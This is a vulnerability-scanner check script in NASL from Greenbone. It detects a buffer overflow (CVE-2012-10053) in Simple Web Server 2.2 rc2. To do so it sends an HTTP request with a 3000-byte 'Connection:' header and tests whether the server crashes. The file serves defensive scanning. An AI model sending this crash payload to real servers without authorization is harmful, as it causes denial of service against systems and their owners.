# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802916");
  script_version("2025-08-21T05:40:06+0000");
  script_tag(name:"last_modification", value:"2025-08-21 05:40:06 +0000 (Thu, 21 Aug 2025)");
  script_tag(name:"creation_date", value:"2012-07-23 16:50:34 +0530 (Mon, 23 Jul 2012)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-10053");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Simple Web Server Connection Header Buffer Overflow Vulnerability");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PMSoftware-SWS/banner");

  script_tag(name:"summary", value:"Simple Web Server is prone to a buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and check whether it is
  able to crash the application.");

  script_tag(name:"insight", value:"A specially crafted data sent via HTTP header 'Connection:'
  triggers a buffer overflow and executes arbitrary code on the target system.");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to execute
  arbitrary code on the target system or cause a denial of service condition.");

  script_tag(name:"affected", value:"Simple Web Server version 2.2 rc2.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://ghostinthelab.wordpress.com/2012/07/19/simplewebserver-2-2-rc2-remote-buffer-overflow-exploit/");
  script_xref(name:"URL", value:"https://web.archive.org/web/20150129002249/http://www.securityfocus.com/bid/54605");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/19937");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20028");
  script_xref(name:"URL", value:"http://www.pmx.it/software/sws.asp");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114892/SimpleWebServer-2.2-rc2-Remote-Buffer-Overflow.html");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

host = http_host_name(port:port);

banner = http_get_remote_headers(port: port);
if(!banner || "Server: PMSoftware-SWS" >!< banner)
  exit(0);

req = string("GET / HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Connection: ", crap(data: "A", length: 3000), "\r\n\r\n");

res = http_send_recv(port:port, data:req);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
